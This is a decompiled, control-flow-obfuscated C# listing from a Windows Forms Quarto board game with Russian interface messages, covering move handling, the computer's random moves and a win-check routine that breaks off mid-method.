					Form1.smethod_43(graphics_, Form1.smethod_42(Color.Red, 3f), ((float)num7 + 0.05f) * (float)size, ((float)num8 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -1514683625) ^ -1727700646;
					continue;
				case 24u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = ((int)num2 * -1067963020) ^ -2078872439;
					continue;
				case 23u:
					Form1.smethod_32((Control)(object)richTextBox1, "Уверены? Для выполнения данного хода нажмите \"Подтвердить\".");
					num = ((int)num2 * -1824706954) ^ -122534528;
					continue;
				case 22u:
					num3++;
					num = 114462768;
					continue;
				case 21u:
					Paint_Board();
					num = (int)(num2 * 735319056) ^ -1597229321;
					continue;
				case 20u:
					num = (int)((num2 * 1348661599) ^ 0x613C856C);
					continue;
				case 19u:
					num = ((int)num2 * -663748669) ^ 0x6C6AC576;
					continue;
				case 18u:
					num3 = 0;
					num = 114462768;
					continue;
				case 15u:
					num = (int)((num2 * 1100560364) ^ 0x4D27FC39);
					continue;
				case 14u:
					num9 = ((board[num8, num7] == null) ? 1 : 0);
					goto IL_013c;
				case 13u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num6, num3]), num7 * size + 4, num8 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = (int)(num2 * 1312295498) ^ -1488259096;
					continue;
				case 12u:
					flag3 = num6 < 4;
					num = 1403390843;
					continue;
				case 11u:
				{
					int num14;
					if (Form1.smethod_41((Control)(object)borderBox[num6, num3]) == Color.Blue)
					{
						num = 270226112;
						num14 = 270226112;
					}
					else
					{
						num = 99946760;
						num14 = 99946760;
					}
					continue;
				}
				case 10u:
					num6++;
					num = ((int)num2 * -1031831915) ^ 0x51990CA6;
					continue;
				case 9u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)((num2 * 139759113) ^ 0x2F355D63);
					continue;
				case 8u:
					num = (int)((num2 * 1757415692) ^ 0x39522B78);
					continue;
				case 7u:
				{
					int num12;
					int num13;
					if (!flag)
					{
						num12 = -651580248;
						num13 = -651580248;
					}
					else
					{
						num12 = -2056926247;
						num13 = -2056926247;
					}
					num = num12 ^ ((int)num2 * -630476374);
					continue;
				}
				case 6u:
					num = (int)((num2 * 1804030612) ^ 0x7C7B36E9);
					continue;
				case 5u:
					num6 = 0;
					num = (int)((num2 * 1313828166) ^ 0xA8872E6);
					continue;
				case 4u:
					Form1.smethod_45(graphics_);
					num = ((int)num2 * -1252019818) ^ 0x412BDE7;
					continue;
				case 3u:
				{
					int num10;
					int num11;
					if (flag3)
					{
						num10 = -358242108;
						num11 = -358242108;
					}
					else
					{
						num10 = -455699684;
						num11 = -455699684;
					}
					num = num10 ^ ((int)num2 * -1845501660);
					continue;
				}
				case 2u:
					num7 = Form1.smethod_38(e) / size;
					num8 = Form1.smethod_39(e) / size;
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0))
					{
						num = (int)(num2 * 373888661) ^ -1256879900;
						continue;
					}
					num9 = 0;
					goto IL_013c;
				case 1u:
				{
					int num4;
					int num5;
					if (flag2)
					{
						num4 = -1546577553;
						num5 = -1546577553;
					}
					else
					{
						num4 = -1974363998;
						num5 = -1974363998;
					}
					num = num4 ^ ((int)num2 * -55061798);
					continue;
				}
				case 0u:
					flag = num3 < 4;
					num = 1356364621;
					continue;
				default:
					return;
				case 17u:
					break;
				case 16u:
					return;
					IL_013c:
					flag2 = (byte)num9 != 0;
					num = 2142267829;
					continue;
				}
				break;
			}
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_06b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_06e5: Expected O, but got Unknown
		int num15 = default(int);
		int num25 = default(int);
		bool flag15 = default(bool);
		Figurine[,] array3 = default(Figurine[,]);
		bool flag13 = default(bool);
		int num8 = default(int);
		bool flag6 = default(bool);
		int num3 = default(int);
		int num4 = default(int);
		int num21 = default(int);
		int num22 = default(int);
		Graphics graphics_ = default(Graphics);
		int num14 = default(int);
		int num13 = default(int);
		int num7 = default(int);
		bool flag17 = default(bool);
		int num46 = default(int);
		bool flag16 = default(bool);
		int num35 = default(int);
		int num24 = default(int);
		int num16 = default(int);
		bool flag4 = default(bool);
		bool flag11 = default(bool);
		int num17 = default(int);
		bool flag3 = default(bool);
		Figurine[,] array2 = default(Figurine[,]);
		int num26 = default(int);
		int num34 = default(int);
		Figurine[,] array = default(Figurine[,]);
		int num12 = default(int);
		int num9 = default(int);
		bool flag12 = default(bool);
		bool flag9 = default(bool);
		int num23 = default(int);
		bool flag5 = default(bool);
		bool flag10 = default(bool);
		bool flag14 = default(bool);
		bool flag7 = default(bool);
		bool flag2 = default(bool);
		int num27 = default(int);
		bool flag8 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = 1745638985;
			while (true)
			{
				uint num2;
				int num18;
				int num51;
				int num39;
				int num28;
				switch ((num2 = (uint)num ^ 0x1FA753E2u) % 187u)
				{
				case 186u:
					num = (int)(num2 * 148999857) ^ -1643677279;
					continue;
				case 185u:
					Form1.smethod_30((Control)(object)borderBox[num15, num25]);
					num = ((int)num2 * -836816671) ^ 0x7D39B5DC;
					continue;
				case 184u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -421761752) ^ -1728576073;
					continue;
				case 183u:
					flag15 = Stop(array3);
					num = (int)((num2 * 937459821) ^ 0x25B86CD6);
					continue;
				case 182u:
					num = (int)(num2 * 532185292) ^ -712916466;
					continue;
				case 181u:
				{
					int num49;
					int num50;
					if (!flag13)
					{
						num49 = -767926022;
						num50 = -767926022;
					}
					else
					{
						num49 = -721179757;
						num50 = -721179757;
					}
					num = num49 ^ ((int)num2 * -1972925834);
					continue;
				}
				case 180u:
					Form1.smethod_32((Control)(object)richTextBox1, "QUARTO! Компьютер выиграл!");
					num = 1442188690;
					continue;
				case 179u:
					num8 = num25;
					num = (int)(num2 * 2015206765) ^ -1185000928;
					continue;
				case 178u:
					num = ((int)num2 * -1766781401) ^ -761533551;
					continue;
				case 177u:
					flag6 = Form1.smethod_41((Control)(object)borderBox[num3, num4]) == Color.Blue;
					num = 1491501411;
					continue;
				case 176u:
					num21 = num3;
					num22 = num4;
					Form1.smethod_5((Control)(object)borderBox[num3, num4], Color.White);
					num = (int)((num2 * 1567045796) ^ 0x1EFCB25A);
					continue;
				case 175u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = ((int)num2 * -1069817014) ^ 0x35483CB0;
					continue;
				case 174u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = (int)(num2 * 262524034) ^ -2045053282;
					continue;
				case 173u:
					(menu as Form3).ContinueLock();
					num = ((int)num2 * -1529291193) ^ 0x6668AECC;
					continue;
				case 172u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num14 + 0.05f) * (float)size, ((float)num13 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num7, num8]), num14 * size + 4, num13 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = ((int)num2 * -1577457273) ^ 0x3F23F4A2;
					continue;
				case 171u:
					num = 361179696;
					continue;
				case 170u:
					flag17 = num46 < 4;
					num = 1827187396;
					continue;
				case 169u:
					flag16 = Standoff(board);
					num = 61372046;
					continue;
				case 168u:
					step++;
					num = (int)(num2 * 2103712761) ^ -1244664568;
					continue;
				case 167u:
					num3++;
					num = (int)(num2 * 882864726) ^ -544990811;
					continue;
				case 166u:
					board[num35, num24] = new Figurine(storage[num21, num22]);
					num = (int)((num2 * 241269175) ^ 0x33C38F35);
					continue;
				case 164u:
					num = ((int)num2 * -933806406) ^ -950946391;
					continue;
				case 163u:
					num15++;
					num = ((int)num2 * -1337635508) ^ 0x5463F270;
					continue;
				case 162u:
					Form1.smethod_7((Control)(object)pictureBox[num46, num16], bool_0: true);
					num = 1347008010;
					continue;
				case 161u:
					num = 1966577065;
					continue;
				case 160u:
					num25++;
					num = (int)(num2 * 892832639) ^ -1445095649;
					continue;
				case 159u:
				{
					int num55;
					int num56;
					if (flag4)
					{
						num55 = 1939154093;
						num56 = 1939154093;
					}
					else
					{
						num55 = 1477136017;
						num56 = 1477136017;
					}
					num = num55 ^ (int)(num2 * 763947023);
					continue;
				}
				case 158u:
					num = (int)(num2 * 945482860) ^ -469702966;
					continue;
				case 157u:
					flag11 = num15 < 4;
					num = 1365250700;
					continue;
				case 156u:
					num = 994355368;
					continue;
				case 155u:
					num = ((int)num2 * -1335573779) ^ -1714301503;
					continue;
				case 154u:
					Form1.smethod_47(200);
					num = ((int)num2 * -1053457839) ^ -1385280109;
					continue;
				case 153u:
					num17 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -1548411815) ^ -1183781936;
					continue;
				case 152u:
				{
					Form1.smethod_7((Control)(object)pictureBox[num15, num25], bool_0: false);
					int num44;
					int num45;
					if (Form1.smethod_41((Control)(object)borderBox[num15, num25]) == Color.Red)
					{
						num44 = -1381510840;
						num45 = -1381510840;
					}
					else
					{
						num44 = -1113829603;
						num45 = -1113829603;
					}
					num = num44 ^ (int)(num2 * 1062171057);
					continue;
				}
				case 151u:
					flag3 = array2[num26, num34] == null;
					num = 308202716;
					continue;
				case 150u:
					array[num12, num9] = new Figurine(storage[num7, num8]);
					num = (int)(num2 * 1137285994) ^ -1881986352;
					continue;
				case 149u:
					num25 = 0;
					num = 206414796;
					continue;
				case 148u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = (int)(num2 * 1504924811) ^ -1044632506;
					continue;
				case 147u:
					num = ((int)num2 * -314235957) ^ -2050984310;
					continue;
				case 146u:
					num4++;
					num = ((int)num2 * -2966705) ^ -452287309;
					continue;
				case 145u:
					flag12 = num3 < 4;
					num = 639136516;
					continue;
				case 144u:
					board[num12, num9] = new Figurine(storage[num7, num8]);
					num = (int)((num2 * 1647892360) ^ 0x2E66BF0D);
					continue;
				case 143u:
					num = (int)(num2 * 747753651) ^ -306899077;
					continue;
				case 142u:
					num = (int)((num2 * 1694902465) ^ 0x3E79AAE0);
					continue;
				case 141u:
					num = (int)(num2 * 89852251) ^ -2060159910;
					continue;
				case 140u:
					num = (int)((num2 * 1115862417) ^ 0xD5F096B);
					continue;
				case 139u:
				{
					int num32;
					int num33;
					if (flag9)
					{
						num32 = 178509394;
						num33 = 178509394;
					}
					else
					{
						num32 = 1909552376;
						num33 = 1909552376;
					}
					num = num32 ^ (int)(num2 * 1443598292);
					continue;
				}
				case 138u:
					num14 = Form1.smethod_33(rnd, 4);
					num = (int)((num2 * 295834407) ^ 0x780CF8F3);
					continue;
				case 137u:
					Form1.smethod_5((Control)(object)borderBox[num7, num8], Color.White);
					num = (int)((num2 * 471490153) ^ 0x67D6686F);
					continue;
				case 136u:
					if (num23 == num7)
					{
						num = ((int)num2 * -1401975598) ^ 0x2CD55D6F;
						continue;
					}
					num18 = 0;
					goto IL_0647;
				case 135u:
					Form1.smethod_20(pictureBox[num7, num8], (Image)null);
					num = (int)(num2 * 2138747515) ^ -1915300726;
					continue;
				case 134u:
					num = ((int)num2 * -4205498) ^ 0x1612F18;
					continue;
				case 133u:
					num = 1355638144;
					continue;
				case 132u:
					num = 1990929347;
					continue;
				case 131u:
					num = 905305915;
					continue;
				case 130u:
				{
					int num66;
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), num4 * size + size / 2, (int)(((float)num3 + 0.05f) * (float)size)) == Color.FromArgb(255, 255, 0, 0))
					{
						num = 1445072945;
						num66 = 1445072945;
					}
					else
					{
						num = 558824400;
						num66 = 558824400;
					}
					continue;
				}
				case 129u:
				{
					int num65;
					if (num34 >= 4)
					{
						num = 734015080;
						num65 = 734015080;
					}
					else
					{
						num = 1529204433;
						num65 = 1529204433;
					}
					continue;
				}
				case 128u:
					num46++;
					num = ((int)num2 * -458646685) ^ 0x716DDBA3;
					continue;
				case 127u:
					num = ((int)num2 * -1284500459) ^ 0x649CF13E;
					continue;
				case 126u:
					array3 = (Figurine[,])Form1.smethod_48((Array)array2);
					num = ((int)num2 * -1765098056) ^ -1139900663;
					continue;
				case 125u:
					num = 2124399637;
					continue;
				case 124u:
				{
					int num63;
					int num64;
					if (flag17)
					{
						num63 = 549739372;
						num64 = 549739372;
					}
					else
					{
						num63 = 106090368;
						num64 = 106090368;
					}
					num = num63 ^ (int)(num2 * 1033308768);
					continue;
				}
				case 123u:
				{
					int num61;
					int num62;
					if (flag15)
					{
						num61 = 1755169838;
						num62 = 1755169838;
					}
					else
					{
						num61 = 116930306;
						num62 = 116930306;
					}
					num = num61 ^ ((int)num2 * -946269498);
					continue;
				}
				case 122u:
					Form1.smethod_30((Control)(object)pictureBox[num7, num8]);
					num = (int)(num2 * 973053586) ^ -2062710829;
					continue;
				case 121u:
					if (!Stop(board))
					{
						num = ((int)num2 * -499072725) ^ -538246091;
						continue;
					}
					num51 = 0;
					goto IL_082e;
				case 120u:
				{
					int num59;
					int num60;
					if (flag16)
					{
						num59 = 2019421553;
						num60 = 2019421553;
					}
					else
					{
						num59 = 355508570;
						num60 = 355508570;
					}
					num = num59 ^ ((int)num2 * -1096459513);
					continue;
				}
				case 119u:
				{
					int num57;
					int num58;
					if (flag12)
					{
						num57 = -189070003;
						num58 = -189070003;
					}
					else
					{
						num57 = -654592506;
						num58 = -654592506;
					}
					num = num57 ^ ((int)num2 * -1000070498);
					continue;
				}
				case 118u:
					Form1.smethod_5((Control)(object)borderBox[num23, num17], Color.Blue);
					num = (int)(num2 * 1047863015) ^ -1253700267;
					continue;
				case 117u:
					num35 = num3;
					num = (int)(num2 * 285542506) ^ -24470852;
					continue;
				case 116u:
					num = (int)((num2 * 1448049551) ^ 0x1B1F698A);
					continue;
				case 115u:
					num8 = 0;
					num15 = 0;
					num = ((int)num2 * -1334942462) ^ 0x7889E69E;
					continue;
				case 114u:
					Paint_Board();
					num = (int)((num2 * 745210934) ^ 0x454DF1C5);
					continue;
				case 113u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num9 + 0.05f) * (float)size, ((float)num12 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -671349560) ^ -300418419;
					continue;
				case 112u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = ((int)num2 * -1664585138) ^ -291931943;
					continue;
				case 111u:
					Form1.smethod_20(pictureBox[num7, num8], (Image)null);
					num = (int)((num2 * 447359104) ^ 0x2C0BA0C1);
					continue;
				case 110u:
					num = ((int)num2 * -652944292) ^ 0x4BA66A7E;
					continue;
				case 109u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = ((int)num2 * -2143681069) ^ -1987943960;
					continue;
				case 108u:
					Form1.smethod_32((Control)(object)richTextBox1, "Подождите, компьютер делает свой ход.");
					Form1.smethod_30((Control)(object)richTextBox1);
					num = (int)(num2 * 1225385553) ^ -1860498678;
					continue;
				case 107u:
					array2 = (Figurine[,])Form1.smethod_48((Array)board);
					array2[num13, num14] = new Figurine(storage[num7, num8]);
					num = ((int)num2 * -1747982848) ^ 0x5A8A8C92;
					continue;
				case 106u:
					num = 588828760;
					continue;
				case 105u:
					Form1.smethod_30((Control)(object)borderBox[num23, num17]);
					num = (int)(num2 * 610782151) ^ -985378883;
					continue;
				case 104u:
					Form1.smethod_15(timer1);
					num = ((int)num2 * -319451169) ^ 0x68CE3A7A;
					continue;
				case 103u:
					(menu as Form3).ContinueLock();
					num = (int)(num2 * 163654113) ^ -207886147;
					continue;
				case 102u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник сделал ход (зелёный). Выберете поле на доске для выбронной противником фигуры (синий).");
					num = ((int)num2 * -2144728225) ^ -756737905;
					continue;
				case 101u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num7, num8]), num9 * size + 4, num12 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = (int)(num2 * 908250357) ^ -733254195;
					continue;
				case 100u:
					num = (int)(num2 * 651773967) ^ -1146911227;
					continue;
				case 99u:
					num34++;
					num = 1467292673;
					continue;
				case 98u:
					board[num13, num14] = new Figurine(storage[num7, num8]);
					storage[num7, num8] = null;
					num = (int)((num2 * 1639916488) ^ 0x7CC5BC27);
					continue;
				case 97u:
				{
					int num53;
					int num54;
					if (flag5)
					{
						num53 = 1925901268;
						num54 = 1925901268;
					}
					else
					{
						num53 = 1410666498;
						num54 = 1410666498;
					}
					num = num53 ^ (int)(num2 * 30487869);
					continue;
				}
				case 96u:
					Form1.smethod_32((Control)(object)richTextBox1, "Выберете фигуру, которой будет играть противник.");
					num = (int)((num2 * 944330828) ^ 0x66CAFB48);
					continue;
				case 95u:
				{
					int num52;
					if (num16 < 4)
					{
						num = 883231572;
						num52 = 883231572;
					}
					else
					{
						num = 1101550813;
						num52 = 1101550813;
					}
					continue;
				}
				case 94u:
					num = (int)((num2 * 391182982) ^ 0x4DE8B7CC);
					continue;
				case 93u:
					num = (int)((num2 * 117171618) ^ 0x1DE8B048);
					continue;
				case 92u:
					num51 = ((!Standoff(board)) ? 1 : 0);
					goto IL_082e;
				case 91u:
					array3[num26, num34] = new Figurine(storage[num23, num17]);
					num = (int)((num2 * 1083923878) ^ 0x383DCEC8);
					continue;
				case 90u:
					num9 = 0;
					num = 829439362;
					continue;
				case 89u:
					num = ((int)num2 * -979608000) ^ -296343951;
					continue;
				case 88u:
					flag10 = false;
					num = (int)(num2 * 613043377) ^ -2122115853;
					continue;
				case 87u:
					flag14 = Form1.smethod_46((Control)(object)pictureBox1);
					num = ((int)num2 * -178599386) ^ -846495019;
					continue;
				case 86u:
					num26 = 0;
					num = (int)((num2 * 1977406266) ^ 0x7203FCDC);
					continue;
				case 85u:
					num12++;
					num = (int)(num2 * 1690147853) ^ -1772944379;
					continue;
				case 84u:
					Form1.smethod_47(1000);
					num = ((int)num2 * -430414489) ^ 0xEE1DE1C;
					continue;
				case 83u:
					num = ((int)num2 * -1353395675) ^ -973202500;
					continue;
				case 82u:
					storage[num21, num22] = null;
					num = (int)((num2 * 1739522890) ^ 0x2A4C5876);
					continue;
				case 81u:
					num = ((int)num2 * -951065833) ^ -554824316;
					continue;
				case 80u:
					num = (int)((num2 * 1535537395) ^ 0x215A97AD);
					continue;
				case 79u:
					num = (int)(num2 * 230251095) ^ -1080434900;
					continue;
				case 78u:
				{
					int num47;
					int num48;
					if (flag14)
					{
						num47 = 528201395;
						num48 = 528201395;
					}
					else
					{
						num47 = 776138504;
						num48 = 776138504;
					}
					num = num47 ^ (int)(num2 * 1130112046);
					continue;
				}
				case 77u:
					num = ((int)num2 * -873442762) ^ 0x246DE58B;
					continue;
				case 76u:
					num46 = 0;
					num = (int)(num2 * 1455674041) ^ -809541155;
					continue;
				case 75u:
					num = ((int)num2 * -1642069616) ^ -179775034;
					continue;
				case 74u:
					num = (int)((num2 * 245724262) ^ 0x64802502);
					continue;
				case 73u:
					Form1.smethod_30((Control)(object)pictureBox[num7, num8]);
					num = ((int)num2 * -1085387269) ^ -213110916;
					continue;
				case 72u:
					num = 932398924;
					continue;
				case 71u:
				{
					int num42;
					int num43;
					if (flag7)
					{
						num42 = -367968693;
						num43 = -367968693;
					}
					else
					{
						num42 = -1311425219;
						num43 = -1311425219;
					}
					num = num42 ^ ((int)num2 * -754931036);
					continue;
				}
				case 70u:
					num = 475120494;
					continue;
				case 68u:
				{
					int num40;
					int num41;
					if (!flag2)
					{
						num40 = 490975661;
						num41 = 490975661;
					}
					else
					{
						num40 = 423571955;
						num41 = 423571955;
					}
					num = num40 ^ (int)(num2 * 1356546312);
					continue;
				}
				case 67u:
					Form1.smethod_30((Control)(object)label2);
					num = (int)((num2 * 1094330471) ^ 0x5175E31A);
					continue;
				case 66u:
					num = ((int)num2 * -817695036) ^ 0x433B0E06;
					continue;
				case 65u:
					num = (int)(num2 * 793020660) ^ -111815163;
					continue;
				case 64u:
					num = (int)(num2 * 531272294) ^ -1782779090;
					continue;
				case 63u:
					num = (int)((num2 * 561749016) ^ 0x4B069BC6);
					continue;
				case 62u:
					array = (Figurine[,])Form1.smethod_48((Array)board);
					num = (int)(num2 * 154416102) ^ -2134569552;
					continue;
				case 61u:
					num26++;
					num = (int)(num2 * 1602358339) ^ -1101462366;
					continue;
				case 60u:
					num = ((int)num2 * -1066220217) ^ -1309305482;
					continue;
				case 59u:
					flag9 = Standoff(board);
					num = ((int)num2 * -1841206622) ^ -1177628406;
					continue;
				case 58u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)((num2 * 1295385969) ^ 0x2E643DEE);
					continue;
				case 57u:
					if (!Standoff(array))
					{
						num = 2089811343;
						num39 = 2089811343;
						continue;
					}
					goto IL_0faa;
				case 56u:
					num27++;
					num = (int)((num2 * 1207416402) ^ 0x509538D6);
					continue;
				case 55u:
					num = ((int)num2 * -1244191314) ^ 0x13289B74;
					continue;
				case 54u:
					Form1.smethod_47(200);
					num = (int)(num2 * 1027376125) ^ -419907211;
					continue;
				case 53u:
					num = ((int)num2 * -1484117942) ^ -1620376623;
					continue;
				case 52u:
					num = ((int)num2 * -949890363) ^ 0x2FB633DF;
					continue;
				case 51u:
					num24 = num4;
					num = ((int)num2 * -2127923313) ^ -1813324239;
					continue;
				case 50u:
					storage[num7, num8] = null;
					num = ((int)num2 * -1198671414) ^ 0x189471C1;
					continue;
				case 49u:
					num = ((int)num2 * -1072226828) ^ -1684934849;
					continue;
				case 48u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					step++;
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = (int)((num2 * 276022680) ^ 0x3F40F0B9);
					continue;
				case 47u:
					num16 = 0;
					num = 612085467;
					continue;
				case 46u:
					num4 = 0;
					num = 1339220124;
					continue;
				case 45u:
					flag13 = board[num12, num9] == null;
					num = 969255813;
					continue;
				case 44u:
				{
					int num37;
					int num38;
					if (flag11)
					{
						num37 = 286003061;
						num38 = 286003061;
					}
					else
					{
						num37 = 1532937773;
						num38 = 1532937773;
					}
					num = num37 ^ ((int)num2 * -1054007868);
					continue;
				}
				case 43u:
					num = ((int)num2 * -311507720) ^ 0x171D5446;
					continue;
				case 42u:
					Form1.smethod_30((Control)(object)pictureBox[num3, num4]);
					num = (int)(num2 * 586928111) ^ -1896825687;
					continue;
				case 41u:
					flag10 = true;
					num = (int)(num2 * 90023414) ^ -517090958;
					continue;
				case 40u:
					num23 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -163533374) ^ 0x529F0522;
					continue;
				case 39u:
				{
					int num36;
					if (num25 >= 4)
					{
						num = 1193516776;
						num36 = 1193516776;
					}
					else
					{
						num = 1320689420;
						num36 = 1320689420;
					}
					continue;
				}
				case 38u:
					num12 = 0;
					num = (int)(num2 * 85113485) ^ -637665205;
					continue;
				case 37u:
					num = 2069094864;
					continue;
				case 36u:
					num21 = 0;
					num22 = 0;
					num35 = 0;
					num = ((int)num2 * -419778190) ^ -2070238285;
					continue;
				case 35u:
					num34 = 0;
					num = 1467292673;
					continue;
				case 34u:
					num27 = 0;
					num = (int)(num2 * 1420741160) ^ -1127508671;
					continue;
				case 33u:
					if (!flag10)
					{
						num = (int)((num2 * 354676828) ^ 0x5FEBF2);
						continue;
					}
					goto IL_123a;
				case 32u:
					num = (int)((num2 * 101294560) ^ 0x550CED7C);
					continue;
				case 31u:
					if (!Stop(array))
					{
						num = (int)(num2 * 707690865) ^ -197167081;
						continue;
					}
					goto IL_0faa;
				case 30u:
					if (storage[num23, num17] != null)
					{
						num = ((int)num2 * -947771613) ^ -685079604;
						continue;
					}
					num18 = 1;
					goto IL_0647;
				case 29u:
					Form1.smethod_30((Control)(object)borderBox[num3, num4]);
					num = (int)((num2 * 1014242214) ^ 0x6F370BE9);
					continue;
				case 28u:
				{
					int num30;
					int num31;
					if (!flag8)
					{
						num30 = -356550305;
						num31 = -356550305;
					}
					else
					{
						num30 = -1474928811;
						num31 = -1474928811;
					}
					num = num30 ^ ((int)num2 * -590028946);
					continue;
				}
				case 27u:
				{
					int num29;
					if (num4 < 4)
					{
						num = 959006050;
						num29 = 959006050;
					}
					else
					{
						num = 1084633633;
						num29 = 1084633633;
					}
					continue;
				}
				case 26u:
					num = (int)((num2 * 394549016) ^ 0x4C9798B5);
					continue;
				case 25u:
					if (num27 >= 9)
					{
						num = 2008594338;
						num28 = 2008594338;
						continue;
					}
					goto IL_123a;
				case 24u:
					num13 = Form1.smethod_33(rnd, 4);
					num = (int)(num2 * 1814105292) ^ -912054068;
					continue;
				case 23u:
					num7 = 0;
					num = ((int)num2 * -420675369) ^ -1203303327;
					continue;
				case 22u:
					Form1.smethod_5((Control)(object)borderBox[num7, num8], Color.White);
					num = (int)((num2 * 1903991224) ^ 0x22EF4AED);
					continue;
				case 21u:
					flag = num26 < 4;
					num = 1108733850;
					continue;
				case 20u:
					Form1.smethod_30((Control)(object)borderBox[num7, num8]);
					num = (int)((num2 * 1425943885) ^ 0x51115A30);
					continue;
				case 19u:
					num = (int)(num2 * 1207904175) ^ -1786807385;
					continue;
				case 18u:
					Form1.smethod_5((Control)(object)borderBox[num15, num25], Color.LimeGreen);
					num = ((int)num2 * -1385787666) ^ 0x43ED5946;
					continue;
				case 17u:
					num24 = 0;
					num3 = 0;
					num = ((int)num2 * -1399405368) ^ 0x277677C4;
					continue;
				case 16u:
				{
					int num19;
					int num20;
					if (flag6)
					{
						num19 = 306919507;
						num20 = 306919507;
					}
					else
					{
						num19 = 466313035;
						num20 = 466313035;
					}
					num = num19 ^ ((int)num2 * -1292273959);
					continue;
				}
				case 15u:
					num18 = ((num17 == num8) ? 1 : 0);
					goto IL_0647;
				case 14u:
					num9++;
					num = 1926724830;
					continue;
				case 13u:
					num16++;
					num = ((int)num2 * -1786069676) ^ -1981165177;
					continue;
				case 12u:
					num7 = num15;
					num = ((int)num2 * -635224096) ^ 0xE62D383;
					continue;
				case 11u:
					num = ((int)num2 * -1295459777) ^ 0x794AB2A0;
					continue;
				case 10u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = (int)(num2 * 1114480004) ^ -1466719434;
					continue;
				case 9u:
					flag5 = board[num13, num14] != null;
					num = ((int)num2 * -374860637) ^ 0x747B0E1D;
					continue;
				case 8u:
					flag4 = num12 < 4;
					num = 392066089;
					continue;
				case 7u:
				{
					int num10;
					int num11;
					if (flag3)
					{
						num10 = -642440008;
						num11 = -642440008;
					}
					else
					{
						num10 = -2053078110;
						num11 = -2053078110;
					}
					num = num10 ^ (int)(num2 * 548937257);
					continue;
				}
				case 6u:
					num = ((int)num2 * -2111743169) ^ -146947279;
					continue;
				case 5u:
					flag2 = num9 < 4;
					num = 707590128;
					continue;
				case 4u:
					num = (int)(num2 * 1004283621) ^ -1097123141;
					continue;
				case 3u:
					Form1.smethod_30((Control)(object)borderBox[num7, num8]);
					num = (int)(num2 * 1416277718) ^ -1445681274;
					continue;
				case 2u:
					Form1.smethod_15(timer1);
					num = 591780397;
					continue;
				case 1u:
				{
					int num5;
					int num6;
					if (flag)
					{
						num5 = 1741752304;
						num6 = 1741752304;
					}
					else
					{
						num5 = 130404954;
						num6 = 130404954;
					}
					num = num5 ^ (int)(num2 * 656049298);
					continue;
				}
				case 0u:
					Form1.smethod_20(pictureBox[num3, num4], (Image)null);
					num = ((int)num2 * -1003689975) ^ 0x58C7836C;
					continue;
				default:
					return;
				case 69u:
					break;
				case 165u:
					return;
					IL_0647:
					flag7 = (byte)num18 != 0;
					num = 1557195676;
					continue;
					IL_123a:
					num = 2040696369;
					num28 = 2040696369;
					continue;
					IL_0faa:
					num = 294222047;
					num39 = 294222047;
					continue;
					IL_082e:
					flag8 = (byte)num51 != 0;
					num = 51652345;
					continue;
				}
				break;
			}
		}
	}

	private bool Stop(Figurine[,] mem)
	{
		bool flag = false;
		int num = 0;
		bool flag3 = default(bool);
		bool result = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num2 = 1033553143;
			while (true)
			{
				uint num3;
				int num11;
				int num19;
				switch ((num3 = (uint)num2 ^ 0x176EC400u) % 75u)
				{
				case 74u:
				{
					int num41;
					if (mem[0, num].Point != mem[1, num].Point)
					{
						num2 = 355037036;
						num41 = 355037036;
					}
					else
					{
						num2 = 1512805123;
						num41 = 1512805123;
					}
					continue;
				}
				case 71u:
				{
					int num67;
					int num68;
					if (mem[0, 0].Big == mem[1, 1].Big)
					{
						num67 = 1863509289;
						num68 = 1863509289;
					}
					else
					{
						num67 = 1338953298;
						num68 = 1338953298;
					}
					num2 = num67 ^ (int)(num3 * 959144340);
					continue;
				}
				case 70u:
				{
					int num31;
					int num32;
					if (mem[1, num].Dark != mem[2, num].Dark)
					{
						num31 = 355312823;
						num32 = 355312823;
					}
					else
					{
						num31 = 1145011581;
						num32 = 1145011581;
					}
					num2 = num31 ^ (int)(num3 * 1398616986);
					continue;
				}
				case 69u:
				{
					int num29;
					int num30;
					if (mem[num, 3] == null)
					{
						num29 = 1269233703;
						num30 = 1269233703;
					}
					else
					{
						num29 = 1373716093;
						num30 = 1373716093;
					}
					num2 = num29 ^ (int)(num3 * 58067238);
					continue;
				}
				case 68u:
				{
					int num14;
					int num15;
					if (mem[3, 3] != null)
					{
						num14 = -1346297924;
						num15 = -1346297924;
					}
					else
					{
						num14 = -167435603;
						num15 = -167435603;
					}
					num2 = num14 ^ (int)(num3 * 1658332536);
					continue;
				}
				case 67u:
				{
					int num56;
					int num57;
